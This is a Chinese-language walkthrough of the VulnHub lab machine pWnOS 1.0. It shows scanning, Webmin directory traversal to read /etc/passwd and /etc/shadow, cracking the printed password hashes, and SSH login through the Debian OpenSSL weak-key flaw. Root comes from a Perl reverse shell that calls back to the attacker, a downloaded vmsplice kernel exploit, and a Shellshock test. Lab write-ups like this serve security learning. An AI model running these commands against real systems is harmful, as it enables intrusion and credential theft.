+++
date = '2026-11-01T10:31:05+08:00'
draft = false
title = '[VulnHub靶机]多种方法!pWnOS1.0渗透记录'
tags = ['渗透','Vulnhub','Perl','WebMin','CGI','PathTraversal','ShellShock','Kernel','OpenSSL']
+++

## 信息收集

### 主机发现与端口扫描

攻击机IP: 10.10.10.3
靶机IP: 10.10.10.4

```shell
sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.4      00:0c:29:5e:18:c9       VMware, Inc.
10.10.10.254    00:50:56:e0:f0:a6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.062 seconds (124.15 hosts/sec). 4 responded
```

探测TCP端口

```shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.4  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-01 10:33 +0800
Nmap scan report for 10.10.10.4
Host is up (0.0012s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
MAC Address: 00:0C:29:5E:18:C9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds
```

探测UDP端口

```shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ sudo nmap -sU --min-rate 10000 10.10.10.4     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-01 10:35 +0800
Nmap scan report for 10.10.10.4
Host is up (0.0014s latency).
Not shown: 998 open|filtered udp ports (no-response)
PORT      STATE SERVICE
137/udp   open  netbios-ns
10000/udp open  ndmp
MAC Address: 00:0C:29:5E:18:C9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

深入扫描TCP端口

```shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ sudo nmap -sT -sV -sC -p22,80,139,445,10000 10.10.10.4                       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-01 10:36 +0800
Nmap scan report for 10.10.10.4
Host is up (0.00040s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 e4:46:40:bf:e6:29:ac:c6:00:e2:b2:a3:e1:50:90:3c (DSA)
|_  2048 10:cc:35:45:8e:f2:7a:a1:cc:db:a0:e8:bf:c7:73:3d (RSA)
80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
445/tcp   open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: 00:0C:29:5E:18:C9 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m04s, deviation: 3h32m07s, median: 4s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: ubuntuvm
|   NetBIOS computer name: 
|   Domain name: nsdlab
|   FQDN: ubuntuvm.NSDLAB
|_  System time: 2026-10-31T21:36:53-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: UBUNTUVM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.34 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ sudo nmap --script=vuln -p22,80,139,445,10000 10.10.10.4
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-01 10:40 +0800
Nmap scan report for 10.10.10.4
Host is up (0.00027s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
|_http-trace: TRACE is enabled
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6'
|   /index/: Potentially interesting folder
|_  /php/: Potentially interesting directory w/ listing on 'apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6'
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.exploit-db.com/exploits/1997/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_      http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
MAC Address: 00:0C:29:5E:18:C9 (VMware)

Host script results:
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: false
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 321.84 seconds
```

### smb信息收集

查看smb共享, 发现home目录

```shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ smbclient -L 10.10.10.4 -N     
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        home            Disk      Home Directory for vmware User
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (ubuntuvm)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        MSHOME               UBUNTUVM
```

尝试访问被拒

```shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ smbclient //10.10.10.4/home -N          
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

## 漏洞利用

### 80Web服务渗透

访问80端口的Web服务, 发现是一个按钮

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS1.0/80%E7%AB%AF%E5%8F%A3.avif)

点击Next

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS1.0/Next.avif)

在第一栏中随便输入字符, 在第二行中选择一个选项, 点击Please Help按钮, 会将我们输入/选择的信息打印在屏幕上

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS1.0/%E6%89%93%E5%8D%B0%E4%BF%A1%E6%81%AF.avif)

将name改为`<script>alert(1)</script>`, 能成功触发XSS, 然而这个漏洞可能没啥用

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS1.0/%E8%A7%A6%E5%8F%91XSS.avif)

在URL末尾加上一个单引号`'`, 发现返回错误信息

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS1.0/80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.avif)

将`connect`替换为`/etc/passwd`, 成功读取内容, 证明存在文件包含漏洞

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS1.0/80%E8%AF%BBpasswd.avif)

尝试读取`/var/log/auth.log`, 成功返回内容, 故可尝试日志投毒, 然而试了一些常见的日志, 都无权限, shadow也读不了

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS1.0/%E6%97%A0%E6%9D%83%E8%AF%BB%E6%97%A5%E5%BF%97.avif)

之前nmap扫描到了/php/目录, 访问发现里面有phpmyadmin, 但需要凭据才能进入

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS1.0/phpmyadmin.avif)

### WebMin Path Traversal

访问10000端口, 是个登录框

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS1.0/10000%E7%AB%AF%E5%8F%A3.avif)

根据之前nmap漏洞扫描的结果, 该服务存在`cve2006-3392`目录穿越漏洞, 通过网络搜索了解到该漏洞原理:  
Webmin程序在调用 simplify_path 函数处理文件路径时，过早地进行了路径简化，而之后才进行 HTML 解码。  
这一顺序错误使得攻击者可以构造特殊的 ..%01 序列。在处理流程中，用于目录跳转的 ../ 序列本应被移除，但 %01 的存在会干扰这一移除过程。当 %01 随后被解码移除时，留下的 .. 便能成功实现目录穿越，从而访问到预期目录之外的文件。  
访问`http://10.10.10.4:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/etc/passwd`就能读取passwd文件

```shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ curl http://10.10.10.4:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/etc/passwd                                                                             
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
dhcp:x:100:101::/nonexistent:/bin/false
syslog:x:101:102::/home/syslog:/bin/false
klog:x:102:103::/home/klog:/bin/false
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
obama:x:1001:1001::/home/obama:/bin/bash
osama:x:1002:1002::/home/osama:/bin/bash
yomama:x:1003:1003::/home/yomama:/bin/bash
```

尝试读取shadow

```shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ curl http://10.10.10.4:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/etc/shadow
root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
daemon:*:14040:0:99999:7:::
bin:*:14040:0:99999:7:::
sys:*:14040:0:99999:7:::
sync:*:14040:0:99999:7:::
games:*:14040:0:99999:7:::
man:*:14040:0:99999:7:::
lp:*:14040:0:99999:7:::
mail:*:14040:0:99999:7:::
news:*:14040:0:99999:7:::
uucp:*:14040:0:99999:7:::
proxy:*:14040:0:99999:7:::
www-data:*:14040:0:99999:7:::
backup:*:14040:0:99999:7:::
list:*:14040:0:99999:7:::
irc:*:14040:0:99999:7:::
gnats:*:14040:0:99999:7:::
nobody:*:14040:0:99999:7:::
dhcp:!:14040:0:99999:7:::
syslog:!:14040:0:99999:7:::
klog:!:14040:0:99999:7:::
mysql:!:14040:0:99999:7:::
sshd:!:14040:0:99999:7:::
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
```

然而使用somd5未查询到结果, john爆破发现了一组凭据(vmware:h4ckm3)

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ john passhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
h4ckm3           (vmware)     
1g 0:00:03:33 DONE (2026-11-01 13:22) 0.004675g/s 65921p/s 299209c/s 299209C/s !!!0mc3t..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

SSH登录该用户

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ ssh -oHostKeyAlgorithms=ssh-rsa vmware@10.10.10.4
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
vmware@10.10.10.4's password: 
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
Last login: Fri Jun 20 14:35:37 2008
vmware@ubuntuvm:~$
```

### 另一种方法: Debian OpenSSL 弱 PRNG

>影响版本: OpenSSL 0.9.8c-1 至 0.9.8g-9  
>漏洞原理: OpenSSL将当前进程的 ID（PID）作为唯一的随机性来源, 在 Linux 系统上，PID 的最大默认值通常是 32768。这意味着，在这些有缺陷的系统上生成的所有密钥，其“随机”种子实际上只来源于一个非常有限的集合（仅约 32768 种可能）由于密钥空间被缩小到仅 32768 种可能, 攻击者完全可以在本地进行离线枚举。 攻击者可以预先为这 32,768 种可能的种子生成对应的公私钥对，建立一个庞大的“弱密钥数据库”。然后，他们只需获取目标服务器公开的公钥（例如 SSH 主机公钥或网站的 SSL 证书），并在数据库中进行比对，就能立刻找出对应的私钥。

使用路径穿越漏洞尝试读取vmware用户的SSH公钥

```shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ curl http://10.10.10.4:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/home/vmware/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQuiE5Wy9DwYVfLrkkcDB2uubtMzGw9hl3smD/OwUyXc/lNED7MNLS8JvehZbMJv1GkkMHvv1Vfcs6FVnBIfPBz0OqFrEGf+a4JEc/eF2R6nIJDIgnjBVeNcQaIM3NOr1rYPzgDwAH/yWoKfzNv5zeMUkMZ7OVC54AovoSujQC/VRdKzGRhhLQmyFVMH9v19UrLgJB6otLcr3d8/uAB2ypTw+LmuIPe9zqrMwxskdfY4Sth2rl6D3bq6Fwca+pYh++phOyKeDPYkBi3hx6R3b3ETZlNCLJjG7+t7kwFdF02Iuw== vmware@ubuntuvm
```

searchsploit查找PRNG exp

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ searchsploit prng    
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
GNU Classpath 0.97.2 - 'gnu.java.security.util.PRNG' Class Entropy (1)                         | multiple/remote/32673.java
GNU Classpath 0.97.2 - 'gnu.java.security.util.PRNG' Class Entropy (2)                         | multiple/remote/32674.cpp
LPRng (RedHat 7.0) - 'lpd' Format String                                                       | linux/remote/227.c
LPRng - use_syslog Remote Format String (Metasploit)                                           | linux/remote/16842.rb
LPRng 3.6.22/23/24 - Remote Command Execution                                                  | linux/remote/226.c
LPRng 3.6.24-1 - Remote Command Execution                                                      | linux/remote/230.c
LPRng 3.6.x - Failure To Drop Supplementary Groups                                             | unix/local/20923.c
LPRNG html2ps 1.0 - Remote Command Execution                                                   | unix/remote/21974.pl
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH        | linux/remote/5622.txt
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH        | linux/remote/5720.py
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH (Ruby) | linux/remote/5632.rb
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

下载5622

```Shell
searchsploit -m 5622
```

```text
the debian openssl issue leads that there are only 65.536 possible ssh
keys generated, cause the only entropy is the pid of the process
generating the key.

This leads to that the following perl script can be used with the
precalculated ssh keys to brute force the ssh login. It works if such a
keys is installed on a non-patched debian or any other system manual
configured to.

On an unpatched system, which doesn't need to be debian, do the following:

keys provided by HD Moore - http://metasploit.com/users/hdm/tools/debian-openssl/
***E-DB Note: Mirror ~ https://github.com/g0tmi1k/debian-ssh***

1. Download http://sugar.metasploit.com/debian_ssh_rsa_2048_x86.tar.bz2
            https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x8
6.tar.bz2)

2. Extract it to a directory

3. Enter into the /root/.ssh/authorized_keys a SSH RSA key with 2048
Bits, generated on an upatched debian (this is the key this exploit will
break)

4. Run the perl script and give it the location to where you extracted
the bzip2 mentioned.
```

下载数据库

```Shell
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
```

解压

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ tar -xjf 5622.tar.bz2
```

搜索公钥

```Shell
cd res
cd 2048
grep -rl 'AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQuiE5Wy9DwYVfLrkkcDB2uubtMzGw9hl3smD/OwUyXc/lNED7MNLS8JvehZbMJv1GkkMHvv1Vfcs6FVnBIfPBz0OqFrEGf+a4JEc/eF2R6nIJDIgnjBVeNcQaIM3NOr1rYPzgDwAH/yWoKfzNv5zeMUkMZ7OVC54AovoSujQC/VRdKzGRhhLQmyFVMH9v19UrLgJB6otLcr3d8/uAB2ypTw+LmuIPe9zqrMwxskdfY4Sth2rl6D3bq6Fwca+pYh++phOyKeDPYkBi3hx6R3b3ETZlNCLJjG7+t7kwFdF02Iuw=='
d8629ce6dc8f2492e1454c13f46adb26-4566.pub
```

得到了公钥文件名, 只要去掉末尾的pub, 就是私钥了  
尝试使用私钥登录, 但发现仍需要密码

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0/rsa/2048]
└─$ ssh -i d8629ce6dc8f2492e1454c13f46adb26-4566 vmware@10.10.10.4 -oHostKeyAlgorithms=ssh-rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
vmware@10.10.10.4's password:
```

给ssh加上-vv选项, 看看登录时发生了什么

```text
debug1: send_pubkey_test: no mutual signature algorithm
debug2: we did not send a packet, disable method
debug1: Next authentication method: password
```

这是因为新版SSH默认不支持ssh-rsa算法进行密钥认证, 加上-oPubkeyAcceptedKeyTypes=ssh-rsa参数即可解决

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0/rsa/2048]
└─$ ssh -i d8629ce6dc8f2492e1454c13f46adb26-4566 vmware@10.10.10.4 -oHostKeyAlgorithms=ssh-rsa -oPubkeyAcceptedKeyTypes=ssh-rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
Last login: Sun Nov  1 00:26:13 2026 from 10.10.10.3
vmware@ubuntuvm:~$
```

## 权限提升

### 法一: WebMin提权

查看shadow权限

```Shell
vmware@ubuntuvm:/var$ ls -ldh /etc/shadow
-rw-r----- 1 root shadow 883 2008-06-12 09:50 /etc/shadow
```

既然能通过webmin读取, 那么就意味着webmin一定拥有高权限, 可以通过它提权  
使用kali自带的webshell, 将perl-reverse-shell.php复制出来并改扩展名为CGI  
这里改为CGI后缀是因为WebMin是使用CGI机制处理Web请求的, WebMin在读取文件时如果检测到文件是CGI后缀就会自动去执行

```shell
┌──(kali㉿kali)-[/usr/share/webshells/perl]
└─$ cp perl-reverse-shell.pl ~/pWnOS1.0/perl-reverse-shell.cgi
```

把IP改为攻击机的IP

```Perl
# Where to send the reverse shell.  Change these.
my $ip = '10.10.10.3';
my $port = 1234;
```

攻击机启动服务器

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

靶机下载反弹shell到家目录并赋予执行权限

```Shell
vmware@ubuntuvm:~$ wget http://10.10.10.3:8000/perl-reverse-shell.cgi
vmware@ubuntuvm:~$ chmod +x perl-reverse-shell.cgi
```

攻击机在1234端口开启监听, 访问`http://10.10.10.4:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/perl-reverse-shell.cgi`即可拿到rootshell

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...
10.10.10.4: inverse host lookup failed: Unknown host
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.4] 59108
 01:35:24 up  5:05,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
vmware   pts/0    10.10.10.3       00:26   27.00s  0.04s  0.04s -bash
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
uid=0(root) gid=0(root)
/
/usr/sbin/apache: can't access tty; job control turned off
# whoami
root
```

### 法二: 内核提权

查看内核版本

```Shell
vmware@ubuntuvm:~$ uname -r                                                                                                     
2.6.22-14-server
```

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ searchsploit Linux Kernel 2.6.22-14 Privilege Escalation
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                            | solaris/local/15962.c
Linux Kernel 2.4.1 < 2.4.37 / 2.6.1 < 2.6.32-rc5 - 'pipe.c' Local Privilege Escalation (3)                                           | linux/local/9844.py
Linux Kernel 2.4.4 < 2.4.37.4 / 2.6.0 < 2.6.30.4 - 'Sendpage' Local Privilege Escalation (Metasploit)                                | linux/local/19933.rb
Linux Kernel 2.6.0 < 2.6.31 - 'pipe.c' Local Privilege Escalation (1)                                                                | linux/local/33321.c
Linux Kernel 2.6.10 < 2.6.31.5 - 'pipe.c' Local Privilege Escalation                                                                 | linux/local/40812.c
Linux Kernel 2.6.17 < 2.6.24.1 - 'vmsplice' Local Privilege Escalation (2)                                                           | linux/local/5092.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                                    | linux/local/50135.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)                   | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)                      | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                   | linux/local/40839.c
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation                                       | linux_x86-64/local/33516.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                           | linux/local/41886.c
Linux Kernel < 2.6.28 - 'fasync_helper()' Local Privilege Escalation                                                                 | linux/local/33523.c
Linux Kernel < 2.6.29 - 'exit_notify()' Local Privilege Escalation                                                                   | linux/local/8369.sh
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)                                            | linux_x86/local/15916.c
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privilege Escalation (2)                                        | linux/local/15944.c
Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation                                             | linux/local/14814.c
Linux Kernel < 2.6.36-rc4-git2 (x86-64) - 'ia32syscall' Emulation Privilege Escalation                                               | linux_x86-64/local/15023.c
Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation                                                 | linux/local/17787.c
Linux Kernel < 2.6.37-rc2 - 'ACPI custom_method' Local Privilege Escalation                                                          | linux/local/15774.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                    | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                         | linux_x86-64/local/44302.c
Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation                                              | linux_x86-64/local/34134.c
Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation                                                            | arm/local/31574.c
Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation                                    | linux_x86-64/local/44299.c
Linux Kernel < 3.8.9 (x86-64) - 'perf_swevent_init' Local Privilege Escalation (2)                                                   | linux_x86-64/local/26131.c
Linux Kernel < 3.8.x - open-time Capability 'file_ns_capable()' Local Privilege Escalation                                           | linux/local/25450.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                                                         | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                    | linux/local/45553.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                        | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                               | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                    | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)            | linux/local/47169.c
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

使用vmsplice(5092)

```Shell
searchsploit -m 5092
```

攻击机启动服务器

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ python3 -m http.server
```

靶机下载exp

```Shell
vmware@ubuntuvm:~$ wget http://10.10.10.3:8000/5092.c
```

编译exp

```Shell
vmware@ubuntuvm:~$ gcc 5092.c -o exp
```

运行即可提权成功

```Shell
vmware@ubuntuvm:~$ ./exp
-----------------------------------
 Linux vmsplice Local Root Exploit
 By qaaz
-----------------------------------
[+] mmap: 0x0 .. 0x1000
[+] page: 0x0
[+] page: 0x20
[+] mmap: 0x4000 .. 0x5000
[+] page: 0x4000
[+] page: 0x4020
[+] mmap: 0x1000 .. 0x2000
[+] page: 0x1000
[+] mmap: 0xb7e59000 .. 0xb7e8b000
[+] root
root@ubuntuvm:~# whoami
root
```

### 法三: ShellShock提权

ShellShock原理在[symfonos3靶机writeup](/posts/vulnhub靶机symfonos3渗透记录#漏洞利用)中写了, 这里就不讲了  
查看Bash版本, 为3.2.25, 很有可能存在漏洞

```Shell
vmware@ubuntuvm:~$ bash --version
GNU bash, version 3.2.25(1)-release (i486-pc-linux-gnu)
Copyright (C) 2005 Free Software Foundation, Inc.
```

验证一下, 发现漏洞存在

```Shell
vmware@ubuntuvm:~$ x='() { :; }; echo vulnerable' bash -c date
vulnerable
